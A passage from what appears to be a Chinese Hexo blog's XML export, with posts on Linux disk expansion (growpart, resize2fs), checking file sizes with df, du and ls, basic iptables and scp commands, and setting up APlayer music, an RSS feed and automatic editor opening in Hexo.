-l</code>命令查看现有云盘大小。</p><p>以下示例返回云盘（/dev/vda</p></li></ol><pre><code>   [root@ecshost ~]# fdisk -l   Disk /dev/vda: 107.4 GB, 107374182400 bytes, 209715200 sectors   Units = sectors of 1 * 512 = 512 bytes   Sector size (logical/physical): 512 bytes / 512 bytes   I/O size (minimum/optimal): 512 bytes / 512 bytes   Disk label type: dos   Disk identifier: 0x0008d73a      Device Boot      Start         End      Blocks   Id  System   /dev/vda1   *        2048    41943039    20970496   83  Linux</code></pre><ol start="2"><li><p>运行<code>df -h</code>命令查看云盘分区大小。</p><p>以下示例返回分区（/dev/vda1</p></li></ol><pre><code>   [root@ecshost ~]# df -h   Filesystem      Size  Used Avail Use% Mounted on   /dev/vda1        20G  1.5G   18G   8% /   devtmpfs        7.8G     0  7.8G   0% /dev   tmpfs           7.8G     0  7.8G   0% /dev/shm   tmpfs           7.8G  344K  7.8G   1% /run   tmpfs           7.8G     0  7.8G   0% /sys/fs/cgroup   tmpfs           1.6G     0  1.6G   0% /run/user/0</code></pre><ol start="3"><li><p>运行<code>growpart &lt;DeviceName&gt; &lt;PartionNumber&gt;</code>命令调用growpart为需要扩容的云盘和对应的第几个分区扩容。</p><p>示例命令表示为系统盘的第一个分区扩容。</p></li></ol><pre><code>   [root@ecshost ~]# growpart /dev/vda 1   CHANGED: partition=1 start=2048 old: size=41940992 end=41943040 new: size=209710462,end=209712510</code></pre><ol start="4"><li><p>运行<code>resize2fs &lt;PartitionName&gt;</code>命令调用resize2fs扩容文件系统。</p><p>示例命令表示为扩容系统盘的/dev/vda1</p></li></ol><pre><code>   [root@ecshost ~]# resize2fs /dev/vda1   resize2fs 1.42.9 (28-Dec-2013)   Filesystem at /dev/vda1 is mounted on /; on-line resizing required   old_desc_blocks = 2, new_desc_blocks = 7   The filesystem on /dev/vda1 is now 26213807 blocks long.</code></pre><p>   <strong>说明</strong> 如果您使用的是xfs文件系统，运行<code>xfs_growfs /dev/vda1</code>命令扩容文件系统。</p><ol start="5"><li><p>运行<code>df -h</code>命令查看云盘分区大小。</p><p>返回分区（/dev/vda1</p></li></ol><pre><code>   [root@ecshost ~]# df -h   Filesystem      Size  Used Avail Use% Mounted on   /dev/vda1        99G  1.6G   93G   2% /   devtmpfs        7.8G     0  7.8G   0% /dev   tmpfs           7.8G     0  7.8G   0% /dev/shm   tmpfs           7.8G  500K  7.8G   1% /run   tmpfs           7.8G     0  7.8G   0% /sys/fs/cgroup   tmpfs           1.6G     0  1.6G   0% /run/user/0</code></pre><h2 id="扩展低内核版本实例的系统盘分区和文件系统"><a href="#扩展低内核版本实例的系统盘分区和文件系统" class="headerlink" title="扩展低内核版本实例的系统盘分区和文件系统"></a>扩展低内核版本实例的系统盘分区和文件系统</h2><p>此处以CentOS 6操作系统为例演示分区扩展的步骤。</p><ol><li>安装dracut-modules-growroot工具。</li></ol><pre><code>   [root@ecshost ~]# yum install -y dracut-modules-growroot</code></pre><p>   如果您使用的是其他软件包管理器，请将<strong>yum</strong>修改为对应的命令。</p><ol start="2"><li>覆盖已有的initramfs文件。</li></ol><pre><code>   [root@ecshost ~]# dracut -f</code></pre><ol start="3"><li><p>运行<code>fdisk -l</code>命令查看现有云盘大小。</p><p>以下示例返回云盘（/dev/vda1</p></li></ol><pre><code>   [root@ecshost ~]# fdisk -l   Disk /dev/vda: 107.4 GB, 107374182400 bytes   255 heads, 63 sectors/track, 13054 cylinders   Units = cylinders of 16065 * 512 = 8225280 bytes   Sector size (logical/physical): 512 bytes / 512 bytes   I/O size (minimum/optimal): 512 bytes / 512 bytes   Disk identifier: 0x0003a7b4      Device Boot      Start         End      Blocks   Id  System   /dev/vda1   *           1        2611    20970496   83  Linux</code></pre><ol start="4"><li><p>运行<code>df -h</code>命令查看云盘分区大小。</p><p>以下示例返回分区（/dev/vda1</p></li></ol><pre><code>   [root@ecshost ~]# df -h   Filesystem      Size  Used Avail Use% Mounted on   /dev/vda1        20G  1.1G   18G   6% /   tmpfs           7.8G     0  7.8G   0% /dev/shm</code></pre><ol start="5"><li><p>运行<code>growpart &lt;DeviceName&gt;&lt;PartionNumber&gt;</code>命令调用growpart为需要扩容的云盘和对应的第几个分区扩容。</p><p>示例命令表示为系统盘的第一个分区扩容。</p></li></ol><pre><code>   [root@ecshost ~]# growpart /dev/vda 1   CHANGED: partition=1 start=2048 old: size=41940992 end=41943040 new: size=209710462,end=209712510</code></pre><ol start="6"><li><p>在控制台重启实例或者调用API RebootInstance。详细步骤请参见<a href="https://help.aliyun.com/document_detail/25440.html#concept-yxw-dwm-xdb" target="_blank" rel="noopener">重启实例</a>和<a href="https://help.aliyun.com/document_detail/25502.html#doc-api-1000211" target="_blank" rel="noopener">RebootInstance</a>。</p></li><li><p>再次远程连接实例。</p></li><li><p>运行<code>resize2fs &lt;PartitionName&gt;</code>命令调用resize2fs扩容文件系统。</p><p>示例命令表示为扩容系统盘的/dev/vda1</p></li></ol><pre><code>   [root@ecshost ~]# resize2fs /dev/vda1   resize2fs 1.41.12 (17-May-2010)   Filesystem at /dev/vda1 is mounted on /; on-line resizing required   old desc_blocks = 2, new_desc_blocks = 7   Performing an on-line resize of /dev/vda1 to 26213807 (4k) blocks.   The filesystem on /dev/vda1 is now 26213807 blocks long.</code></pre><p>   <strong>说明</strong> 如果您使用的是xfs文件系统，运行<code>xfs_growfs /dev/vda1</code>命令扩容文件系统。</p><ol start="9"><li><p>运行<code>df -h</code>命令查看云盘分区大小。</p><p>返回分区（/dev/vda1</p></li></ol><pre><code>   [root@ecshost ~]# df -h   Filesystem      Size  Used Avail Use% Mounted on   /dev/vda1        99G  1.1G   93G   2% /   tmpfs           7.8G     0  7.8G   0% /dev/shm</code></pre><blockquote><p><a href="https://help.aliyun.com/document_detail/111738.html?spm=a2c4g.11186623.2.7.44084c07SEKQPj#concept-ocb-htw-dhb" target="_blank" rel="noopener">搬于阿里</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 磁盘扩容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux查看文件大小，文件个数的方法</title>
      <link href="/2019/09/05/linux-cha-kan-wen-jian-da-xiao-wen-jian-ge-shu-de-fang-fa/"/>
      <url>/2019/09/05/linux-cha-kan-wen-jian-da-xiao-wen-jian-ge-shu-de-fang-fa/</url>
      
        <content type="html"><![CDATA[<h4 id="linux-下查看文件个数及大小"><a href="#linux-下查看文件个数及大小" class="headerlink" title="linux 下查看文件个数及大小"></a>linux 下查看文件个数及大小</h4><p>ls -l |grep “^-“|wc -l<br>或<br>find ./company -type f | wc -l<br>查看某文件夹下文件的个数，包括子文件夹里的。<br>ls -lR|grep “^-“|wc -l<br>查看某文件夹下文件夹的个数，包括子文件夹里的。<br>ls -lR|grep “^d”|wc -l<br>说明：<br>ls -l<br>长列表输出该目录下文件信息(注意这里的文件，不同于一般的文件，可能是目录、链接、设备文件等)<br>grep “^-“<br>这里将长列表输出信息过滤一部分，只保留一般文件，如果只保留目录就是 ^d<br>wc -l<br>统计输出信息的行数，因为已经过滤得只剩一般文件了，所以统计结果就是一般文件信息的行数，又由于<br>一行信息对应一个文件，所以也就是文件的个数。</p><h4 id="Linux查看文件夹大小"><a href="#Linux查看文件夹大小" class="headerlink" title="Linux查看文件夹大小"></a>Linux查看文件夹大小</h4><p>du -sh 查看当前文件夹大小<br>du -sh * | sort -n 统计当前文件夹(目录)大小，并按文件大小排序<br>du -sk filename 查看指定文件大小</p><p>当磁盘大小超过标准时会有报警提示，这时如果掌握df和du命令是非常明智的选择。</p><p>​    df可以查看一级文件夹大小、使用比例、档案系统及其挂入点，但对文件却无能为力。<br>​    du可以查看文件及文件夹的大小。</p><p>​    两者配合使用，非常有效。比如用df查看哪个一级目录过大，然后用df查看文件夹或文件的大小，如此便可迅速确定症结。</p><p>​    下面分别简要介绍</p><p>​    df命令可以显示目前所有文件系统的可用空间及使用情形，请看下列这个例子：</p><p>​    参数 -h 表示使用「Human-readable」的输出，也就是在档案系统大小使用 GB、MB 等易读的格式。</p><p>​    上面的命令输出的第一个字段（Filesystem）及最后一个字段（Mounted on）分别是档案系统及其挂入点。我们可以看到 /dev/sda1 这个分割区被挂在根目录下。</p><p>​    接下来的四个字段 Size、Used、Avail、及 Use% 分别是该分割区的容量、已使用的大小、剩下的大小、及使用的百分比。 FreeBSD下，当硬盘容量已满时，您可能会看到已使用的百分比超过 100%，因为 FreeBSD 会留一些空间给 root，让 root 在档案系统满时，还是可以写东西到该档案系统中，以进行管理。</p><p>​    du：查询文件或文件夹的磁盘使用空间</p><p>​    如果当前目录下文件和文件夹很多，使用不带参数du的命令，可以循环列出所有文件和文件夹所使用的空间。这对查看究竟是那个地方过大是不利的，所以得指定深入目录的层数，参数：–max-depth=，这是个极为有用的参数！如下，注意使用“*”，可以得到文件的使用空间大小.</p><p>​    提醒：一向命令比linux复杂的FreeBSD，它的du命令指定深入目录的层数却是比linux简化，为 -d。</p><p>​    值得注意的是，看见一个针对du和df命令异同的文章：《<a href="http://www.diybl.com/course/6_system/linux/Linuxjs/2008716/133217.html" target="_blank" rel="noopener">du df 差异导致文件系统误报解决</a>》。</p><p>​    du 统计文件大小相加<br>​    df  统计数据块使用情况</p><p>​    如果有一个进程在打开一个大文件的时候,这个大文件直接被rm 或者mv掉，则du会更新统计数值，df不会更新统计数值,还是认为空间没有释放。直到这个打开大文件的进程被Kill掉。</p><p>​    如此一来在定期删除 /var/spool/clientmqueue下面的文件时，如果没有杀掉其进程，那么空间一直没有释放。</p><p>​    使用下面的命令杀掉进程之后，系统恢复。<br>​    fuser -u /var/spool/clientmqueue</p><hr><h4 id="查看linux文件目录的大小和文件夹包含的文件数"><a href="#查看linux文件目录的大小和文件夹包含的文件数" class="headerlink" title="查看linux文件目录的大小和文件夹包含的文件数"></a>查看linux文件目录的大小和文件夹包含的文件数</h4><p>​    统计总数大小</p><p>​    du -sh xmldb/</p><p>​    du -sm * | sort -n //统计当前目录大小 并安大小 排序</p><p>​    du -sk * | sort -n</p><p>​    du -sk * | grep guojf //看一个人的大小</p><p>​    du -m | cut -d “/“ -f 2 //看第二个/ 字符前的文字</p><h4 id="查看此文件夹有多少文件-有多少文件"><a href="#查看此文件夹有多少文件-有多少文件" class="headerlink" title="查看此文件夹有多少文件 ///* 有多少文件"></a>查看此文件夹有多少文件 /<em>/</em>/* 有多少文件</h4><p>​    du xmldb/</p><p>​    du xmldb/<em>/</em>/* |wc -l</p><p>​    40752</p><p>​    解释：</p><p>​    wc [-lmw]</p><p>​    参数说明：</p><p>​    -l :多少行</p><p>​    -m:多少字符</p><p>​    -w:多少字</p><hr><h4 id="Linux-ls以K、M、G为单位查看文件大小"><a href="#Linux-ls以K、M、G为单位查看文件大小" class="headerlink" title="Linux:ls以K、M、G为单位查看文件大小"></a>Linux:ls以K、M、G为单位查看文件大小</h4><p>#man ls</p><p>……</p><p>-h, –human-readable</p><p>​                print sizes in human readable format (e.g., 1K 234M 2G)</p><p>……</p><p># ls</p><p>cuss.war    nohup.out</p><p># ls -l</p><p>total 30372</p><p>-rw-r–r–    1 root root 31051909 May 24 10:07 cuss.war</p><p>-rw——-    1 root root          0 Mar 20 13:52 nohup.out</p><p># ls -lh</p><p>total 30M</p><p>-rw-r–r–    1 root root 30M May 24 10:07 cuss.war</p><p>-rw——-    1 root root     0 Mar 20 13:52 nohup.out</p><p># ll -h</p><p>total 30M</p><p>-rw-r–r–    1 root root 30M May 24 10:07 cuss.war</p><p>-rw——-    1 root root     0 Mar 20 13:52 nohup.out</p><h4 id="df命令详细用法"><a href="#df命令详细用法" class="headerlink" title="df命令详细用法"></a>df命令详细用法</h4><p>a：显示全部的档案系统和各分割区的磁盘使用情形<br>i：显示i -nodes的使用量<br>k：大小用k来表示 (默认值)<br>t：显示某一个档案系统的所有分割区磁盘使用量<br>x：显示不是某一个档案系统的所有分割区磁盘使用量<br>T：显示每个分割区所属的档案系统名称<br>常用命令：df -hi </p><p>操作详解 </p><p>引用<br>指令 df 可以显示目前所有档案系统的最大可用空间及使用情形，请看下列这个例子： </p><p># df -h<br>Filesystem Size Used Avail Capacity Mounted on<br>/dev/ad0s1a 1.9G 389M 1.4G 21% /<br>devfs 1.0K 1.0K 0B 100% /dev<br>/dev/ad0s1d 989M 54K 910M 0% /tmp<br>/dev/ad0s1f 4.8G 3.8G 657M 86% /usr<br>/dev/ad0s1e 1.9G 149M 1.6G 8% /var<br>/dev/ad0s1g 26G 890K 24G 0% /volume2<br>/dev/da0s1d 325G 261G 38G 87% /volume1 </p><p>我们加了参数 -h 表示使用「Human-readable」的输出，也就是在档案系统大小使用 GB、MB 等易读的格式。 </p><p>上面的指令输出的第一个字段及最后一个字段分别是档案系统及其挂入点。我们可以看到 /dev/ad0s1a 这个分割区被挂在根目录下。我们在上一小节提到过 ad 所代表的是 IDE 的硬盘，而 s1 表示第一个主要扇区。我另外有一个 SCSI 硬盘，它的代号是 da，它的容量很大，主要用来存放数据。devfs 是一个特别的档案系统，该档案系统并非真的磁盘，而是 FreeBSD 用来管理系统硬件装置的虚拟档案系统。 </p><p>接下来的四个字段 Size、Used、Avail、及 Capacity 分别是该分割区的容量、已使用的大小、剩下的大小、及使用的百分比。当硬盘容量已满时，您可能会看到已使用的百分比超过 100%，因为 FreeBSD 会留一些空间给 root，让 root 在档案系统满时，还是可以写东西到该档案系统中，以进行管理。 </p><p>另外，我们还可以使用参数 -i 来查看目前档案系统 inode 的使用情形。有的时候虽然档案系统还有空间，但若没有足够的 inode 来存放档案的信息，一样会不能增加新的档案。 </p><h4 id="df-ih"><a href="#df-ih" class="headerlink" title="# df -ih"></a># df -ih</h4><p>Filesystem Size Used Avail Capacity iused ifree %iused Mounted on<br>/dev/ad0s1a 1.9G 389M 1.4G 21% 20495 262127 7% /<br>devfs 1.0K 1.0K 0B 100% 0 0 100% /dev<br>/dev/ad0s1d 989M 62K 910M 0% 24 141286 0% /tmp<br>/dev/ad0s1f 4.8G 3.8G 657M 86% 311439 348015 47% /usr<br>/dev/ad0s1e 1.9G 149M 1.6G 8% 1758 280864 1% /var<br>/dev/ad0s1g 26G 890K 24G 0% 12 3532786 0% /volume2<br>/dev/da0s1d 325G 261G 38G 87% 707277 43311409 2% /volume1<br>我们可以看到根目录的已经用掉的 inode 数量为 20495，还有 262127 的可用 inode。 </p><p>小提示<br>还记得什么是 inode 吗？所谓的 inode 是用来存放档案及目录的基本信息 (metadata)，包含时间、档名、使用者及群组等。在分割扇区时，系统会先做出一堆 inode 以供以后使用，inode 的数量关系着系统中可以建立的档案及目录总数。如果要存的档案大部分都很小，则同样大小的硬盘中会有较多的档案，也就是说需要较多的 inode 来挂档案及目录。 </p><h4 id="du：查询档案或目录的磁盘使用空间"><a href="#du：查询档案或目录的磁盘使用空间" class="headerlink" title="du：查询档案或目录的磁盘使用空间"></a>du：查询档案或目录的磁盘使用空间</h4><p>a：显示全部目录和其次目录下的每个档案所占的磁盘空间<br>b：大小用bytes来表示 (默认值为k bytes)<br>c：最后再加上总计 (默认值)<br>s：只显示各档案大小的总合 (summarize)<br>x：只计算同属同一个档案系统的档案<br>L：计算所有的档案大小<br>常用命令：du -a </p><p>操作详解 </p><p>引用<br>指令 du 能以指定的目录下的子目录为单位，显示每个目录内所有档案所占用的磁盘空间大小。例如： </p><p># du -h /etc<br>104K /etc/defaults<br>6.0K /etc/X11<br>8.0K /etc/bluetooth<br>4.0K /etc/gnats<br>52K /etc/isdn<br>388K /etc/mail<br>68K /etc/mtree<br>2.0K /etc/ntp<br>38K /etc/pam.d<br>44K /etc/periodic/daily<br>6.0K /etc/periodic/monthly<br>42K /etc/periodic/security<br>16K /etc/periodic/weekly<br>110K /etc/periodic<br>6.0K /etc/ppp<br>318K /etc/rc.d<br>2.0K /etc/skel<br>130K /etc/ssh<br>10K /etc/ssl<br>1.7M /etc<br>我们目样使用 -h 参数来显示 human-readable 的格式。在应用时，我们可以使用 du 这个指令来查看哪个目录占用最多的空间。不过，du 的输出结果通常很长，我们可以加上 -s 参数来省略指定目录下的子目录，而只显示该目录的总合即可： </p><p># du -sh /etc<br>1.7M /etc<br>在查看目录的使用情形时，我们可以将输出结果导到 sort 指令进行排序，以了解哪个档案用了最多的空间： </p><p># du /etc | sort -nr | more<br>1746 /etc<br>388 /etc/mail<br>318 /etc/rc.d<br>130 /etc/ssh<br>110 /etc/periodic<br>104 /etc/defaults<br>68 /etc/mtree<br>52 /etc/isdn<br>44 /etc/periodic/daily<br>42 /etc/periodic/security<br>38 /etc/pam.d<br>16 /etc/periodic/weekly<br>10 /etc/ssl<br>8 /etc/bluetooth<br>6 /etc/ppp<br>6 /etc/periodic/monthly<br>6 /etc/X11<br>4 /etc/gnats<br>2 /etc/skel<br>2 /etc/ntp<br>sort 的参数 -nr 表示要以数字排序法进行反向排序，因为我们要对目录大小做排序，所以不可以使用 human-readable 的大小输出，不然目录大小中会有 K、M 等字样，会造成排序不正确。</p><blockquote><p><a href="https://www.cnblogs.com/gongchixin/articles/8310645.html" target="_blank" rel="noopener">https://www.cnblogs.com/gongchixin/articles/8310645.html</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux常用指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>扩盘与WAF问题</title>
      <link href="/2019/09/05/kuo-pan-yu-waf-wen-ti/"/>
      <url>/2019/09/05/kuo-pan-yu-waf-wen-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感谢雪师傅的辅助</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>df -h   查看运行内存大小<br>ll<br>  -sh<br>  -dh<br>pwd   当前所在的目录<br>top  cup占用情况<br>ls<br>  -l 权限<br>  -h 大小<br>  -a 所有包含隐藏的</p><p>mtr -r [ip]              探测为什么不通<br>telnet  [ip] [端口]      探测端口是否正常<br>iptables -nL         查看防火墙配置<br>iptables -I INPUT -s xxx.xxx.xxx.xxx -j ACCEPT   白名单</p><p>du -sh * | sort -n  查看当前文件夹下文件大大小</p><p>chmod -R 775 test（修改test权限）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux常用指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo插入音乐</title>
      <link href="/2019/09/01/hexo-cha-ru-yin-le/"/>
      <url>/2019/09/01/hexo-cha-ru-yin-le/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是APlayer"><a href="#什么是APlayer" class="headerlink" title="什么是APlayer"></a>什么是APlayer</h2><p><a href="https://aplayer.js.org/#/zh-Hans/" target="_blank" rel="noopener">https://aplayer.js.org/#/zh-Hans/</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>npm install aplayer –save</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>找到node_modules -&gt; aplayer（复制他的dist文件夹）</p><p>复制到F:\blog\themes\这里是你模板名称\source下（也就是你的主题配置文件下的source）</p><h5 id="在dist文件夹下新建music-js"><a href="#在dist文件夹下新建music-js" class="headerlink" title="在dist文件夹下新建music.js"></a>在dist文件夹下新建music.js</h5><h6 id="music-js-代码"><a href="#music-js-代码" class="headerlink" title="music.js 代码"></a>music.js 代码</h6><pre><code>const ap = new APlayer({    container: document.getElementById('aplayer'),    fixed: true,    autoplay: true,    lrcType: 3,    audio: [      {        name: "在水一方",        artist: '李健',        url: 'http://other.web.ri01.sycdn.kuwo.cn/resource/n2/31/23/2648161877.mp3',        cover: 'http://star.kuwo.cn/star/starheads/180/73/49/1131928591.jpg',        lrc: 'song-post/zaishuiyifang.lrc'      },    ]});</code></pre><p>在你想播放的页面插入下面代码，xxx.ejs插入以下代码( &lt; body&gt;&lt; /body&gt;内)</p><pre><code>&lt;!-- 插入音乐 --&gt;    &lt;link rel="stylesheet" href="/dist/APlayer.min.css"&gt;    &lt;div id="aplayer" &gt;&lt;/div&gt;    &lt;script type="text/javascript" src="/dist/APlayer.min.js"&gt;&lt;/script&gt;    &lt;script type="text/javascript" src="/dist/music.js"&gt;&lt;/script&gt;</code></pre><p>然后即可播放音乐</p><blockquote><p>转载于：<a href="https://blog.csdn.net/weixin_40842539/article/details/87655662" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40842539/article/details/87655662</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客配置RSS插件</title>
      <link href="/2019/09/01/hexo-bo-ke-pei-zhi-rss-cha-jian/"/>
      <url>/2019/09/01/hexo-bo-ke-pei-zhi-rss-cha-jian/</url>
      
        <content type="html"><![CDATA[<h3 id="1、安装rss插件"><a href="#1、安装rss插件" class="headerlink" title="1、安装rss插件"></a>1、安装rss插件</h3><p>在站点根目录下安装  </p><pre class="line-numbers language-javascript"><code class="language-javascript">npm install hexo<span class="token operator">-</span>generator<span class="token operator">-</span>feed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、配置-config-yml文件，启用插件"><a href="#2、配置-config-yml文件，启用插件" class="headerlink" title="2、配置_config.yml文件，启用插件"></a>2、配置<code>_config.yml</code>文件，启用插件</h3><pre class="line-numbers language-javascript"><code class="language-javascript"># Extensionsplugins<span class="token punctuation">:</span>  hexo<span class="token operator">-</span>generator<span class="token operator">-</span>feed#Feed Atomfeed<span class="token punctuation">:</span>  type<span class="token punctuation">:</span> atom  path<span class="token punctuation">:</span> atom<span class="token punctuation">.</span>xml  limit<span class="token punctuation">:</span> <span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、在yilia-plus主题添加RSS订阅配置-可以跳过此步骤"><a href="#3、在yilia-plus主题添加RSS订阅配置-可以跳过此步骤" class="headerlink" title="3、在yilia-plus主题添加RSS订阅配置(可以跳过此步骤)"></a>3、在<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FJoeyBling%2Fhexo-theme-yilia-plus" target="_blank" rel="noopener">yilia-plus</a>主题添加RSS订阅配置<code>(可以跳过此步骤)</code></h3><blockquote><p> theme-yilia-plus  </p></blockquote><pre class="line-numbers language-javascript"><code class="language-javascript"># RSS订阅rss<span class="token punctuation">:</span> <span class="token operator">/</span>atom<span class="token punctuation">.</span>xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4、生成RSS订阅文件"><a href="#4、生成RSS订阅文件" class="headerlink" title="4、生成RSS订阅文件"></a>4、生成RSS订阅文件</h3><pre class="line-numbers language-javascript"><code class="language-javascript">hexo g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ask.qcloudimg.com/http-save/yehe-3005412/ao90gc2adv.png?imageView2/2/w/1620" alt="img"></p><blockquote><p>转载于：<a href="https://cloud.tencent.com/developer/article/1472865" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1472865</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo添加文章时编辑器自动打开</title>
      <link href="/2019/09/01/hexo-tian-jia-wen-zhang-shi-bian-ji-qi-zi-dong-da-kai/"/>
      <url>/2019/09/01/hexo-tian-jia-wen-zhang-shi-bian-ji-qi-zi-dong-da-kai/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Hexo创建文章的格式在post目录修改"><a href="#0x00-Hexo创建文章的格式在post目录修改" class="headerlink" title="0x00 Hexo创建文章的格式在post目录修改"></a>0x00 Hexo创建文章的格式在post目录修改</h2><p><a href="/img/postwiki.png" title="post Wiki">post Wiki</a></p><h2 id="0x01Hexo添加文章时编辑器自动打开"><a href="#0x01Hexo添加文章时编辑器自动打开" class="headerlink" title="0x01Hexo添加文章时编辑器自动打开"></a>0x01Hexo添加文章时编辑器自动打开</h2><ol><li>在my-blog根目录新建一个文件夹，命名为scripts。</li><li>然后在scripts文件夹中，新建一个js文件，命名为auto_open.js。</li><li>其内容如下</li></ol><pre><code>var spawn = require('child_process').exec;// Hexo 2.x 用户复制这段//hexo.on('new', function(path){//  spawn('start  "markdown编辑器绝对路径.exe" ' + path);//});//D:\Program Files\Typora\Typora.exe 是MakdownPad编辑器在我本地的路径！// Hexo 3 用户复制这段hexo.on('new', function(data){  spawn('start  "D:\Program Files\Typora\Typora.exe" ' + data.path);});</code></pre><p>然后正常操作测试下，在hexo根目录：hexo new “test测试”。成功弹出！！！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux常用指令</title>
      <link href="/2019/08/27/linux-chang-yong-zhi-ling/"/>
      <url>/2019/08/27/linux-chang-yong-zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="从linux服务器下载文件到本地命令"><a href="#从linux服务器下载文件到本地命令" class="headerlink" title="从linux服务器下载文件到本地命令"></a>从linux服务器下载文件到本地命令</h1><h3 id="1-使用scp命令"><a href="#1-使用scp命令" class="headerlink" title="1.使用scp命令"></a>1.使用scp命令</h3><p>scp /home/work/source.txt <a href="mailto:work@192.168.0.10" target="_blank" rel="noopener">work@192.168.0.10</a>:/home/work/   #把本地source.txt文件拷贝到192.168.0.10机器上的/home/work目录下</p><p>scp <a href="mailto:work@192.168.0.10" target="_blank" rel="noopener">work@192.168.0.10</a>:/home/work/source.txt /home/work/  #把192.168.0.10机器上的source.txt文件拷贝到本地的/home/work目录下</p><p>scp <a href="mailto:work@192.168.0.10" target="_blank" rel="noopener">work@192.168.0.10</a>:/home/work/source.txt <a href="mailto:work@192.168.0.11" target="_blank" rel="noopener">work@192.168.0.11</a>:/home/work/          #把192.168.0.10机器上的source.txt文件拷贝到192.168.0.11机器的/home/work目录下</p><p>scp -r /home/work/sourcedir <a href="mailto:work@192.168.0.10" target="_blank" rel="noopener">work@192.168.0.10</a>:/home/work/  #拷贝文件夹，加-r参数</p><h2 id="2-使用xshell工具"><a href="#2-使用xshell工具" class="headerlink" title="2.使用xshell工具"></a>2.使用xshell工具</h2><p>使用xshell来操作服务非常方便，传文件也比较方便。<br>就是使用rz，sz<br>首先，服务器要安装了rz，sz<br>yum install lrzsz<br>当然你的本地windows主机也通过ssh连接了linux服务器<br>运行rz，会将windows的文件传到linux服务器<br>运行sz filename，会将文件下载到windows本地</p><h1 id="Linux常用命令大全（非常全！！！）"><a href="#Linux常用命令大全（非常全！！！）" class="headerlink" title="Linux常用命令大全（非常全！！！）"></a>Linux常用命令大全（非常全！！！）</h1><blockquote><p>本人比较懒直接搬来的原版在：<a href="https://www.cnblogs.com/yjd_hycf_space/p/7730690.html" target="_blank" rel="noopener">https://www.cnblogs.com/yjd_hycf_space/p/7730690.html</a></p></blockquote><p><strong>系统信息</strong><br>arch 显示机器的处理器架构<br>uname -m 显示机器的处理器架构<br>uname -r 显示正在使用的内核版本<br>dmidecode -q 显示硬件系统部件 